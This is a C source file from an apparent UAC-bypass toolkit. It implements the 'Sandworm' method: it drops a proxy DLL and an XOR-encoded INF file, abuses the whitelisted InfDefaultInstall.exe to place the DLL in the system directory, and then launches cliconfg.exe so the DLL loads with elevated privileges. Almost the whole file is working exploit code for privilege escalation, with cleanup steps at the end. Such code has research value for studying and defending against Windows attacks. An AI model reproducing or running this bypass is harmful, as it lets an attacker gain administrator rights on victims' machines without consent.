/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2019
*
*  TITLE:       SANDWORM.C
*
*  VERSION:     3.17
*
*  DATE:        18 Mar 2019
*
*  Sandworm method.
*
*  Used as part of exploit which is linked with rumored "russian hackers".
*  - Вы говорите по-русски?
*  - Yes I can!
*
*  Originally it was on list to include in first UACMe releases but was considered
*  way too out-date and unavailable under something else than Windows 7 + Windows 8.
*  However since Vault7 release this method again poped up in mind, thanks to CIA.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "encresource.h"

/*
g_SandwormInf

; 61883.INF
; Copyright (c) Microsoft Corporation.  All rights reserved.

[Version]
Signature="$CHICAGO$"
Class=61883
ClassGuid={7EBEFBC0-3200-11D2-B4C2-00A0C9697D07}
Provider=%Msft%
DriverVer=16/21/2006,6.1.7600.16385

[DestinationDirs]
DefaultDestDir = 11

[DefaultInstall]
CopyFiles=@ntwdblib.dll
*/

/*
* ucmSandwormMethod
*
* Purpose:
*
* Bypass UAC by using whitelisted InfDefaultInstall executable.
* Originally Sandworm used InfDefaultInstall to write to the HKLM.
* We will use it for dll hijack.
* Target application in our case will be cliconfg.exe
*
* Fixed in MS14-060
*
*/
NTSTATUS ucmSandwormMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    WCHAR szPayloadDll[MAX_PATH * 2];
    WCHAR szInstallInf[MAX_PATH * 2];
    WCHAR szProcessBuf[MAX_PATH * 2];

    RtlSecureZeroMemory(szPayloadDll, sizeof(szPayloadDll));
    RtlSecureZeroMemory(szInstallInf, sizeof(szInstallInf));

    //
    // Write proxy dll to the disk.
    //
    _strcpy(szPayloadDll, g_ctx->szTempDirectory);
    _strcat(szPayloadDll, NTWDBLIB_DLL);
    if (supWriteBufferToFile(szPayloadDll, ProxyDll, ProxyDllSize)) {

        //
        // Write installation inf to the disk.
        //
        _strcpy(szInstallInf, g_ctx->szTempDirectory);
        _strcat(szInstallInf, PACKAGE_INF);

        if (supDecodeAndWriteBufferToFile(szInstallInf, 
            (CONST PVOID)&g_encodedSandwormInf, 
            sizeof(g_encodedSandwormInf),
            AKAGI_XOR_KEY2)) 
        {
            //
            // Run infdefaultinstall.exe to copy our payload dll.
            //
            RtlSecureZeroMemory(&szProcessBuf, sizeof(szProcessBuf));
            _strcpy(szProcessBuf, g_ctx->szSystemDirectory);
            _strcat(szProcessBuf, INFDEFAULTINSTALL_EXE);
            if (supRunProcess(szProcessBuf, szInstallInf)) {

                //
                // Run target executable.
                //
                RtlSecureZeroMemory(&szProcessBuf, sizeof(szProcessBuf));
                _strcpy(szProcessBuf, g_ctx->szSystemDirectory);
                _strcat(szProcessBuf, CLICONFG_EXE);
                if (supRunProcess(szProcessBuf, NULL))
                    MethodResult = STATUS_SUCCESS;
            }
        }

    }

    if (szInstallInf[0] != 0) {
        DeleteFile(szInstallInf);
    }
    if (szPayloadDll[0] != 0) {
        DeleteFile(szPayloadDll);
    }

    return MethodResult;
}
